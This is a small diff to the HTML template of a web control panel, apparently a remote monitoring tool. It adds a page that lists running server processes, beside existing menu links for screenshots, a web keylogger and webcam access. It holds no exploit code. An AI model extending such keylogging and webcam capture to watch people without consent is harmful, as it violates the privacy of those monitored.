@@ -13,6 +13,7 @@
         <div class="menu">
             <a href="/start">Start App</a>
             <a href="/stop">Stop App</a>
+            <a href="/processes">Processes</a>
             <a href="/screenshot">Screenshot</a>
             <a href="/keylogger">Web Keylogger</a>
             <a href="/webcam">Webcam</a>
@@ -46,6 +47,18 @@
             <button name="action" value="{{ mode }}">
                 {{ "Start App" if mode=="start" else "Stop App" }}
             </button>
+        </form>
+        {% endif %}
+
+        <!-- PROCESS LIST -->
+        {% if mode == "processes" %}
+        <h2>Running Processes (Top 50 CPU)</h2>
+        <p>Danh sách các tiến trình đang chạy trên Server:</p>
+        
+        <pre class="keybox" style="height: 500px;">{{ process_list }}</pre>
+
+        <form action="/processes" method="GET">
+            <button>Refresh List</button>
         </form>
         {% endif %}
 
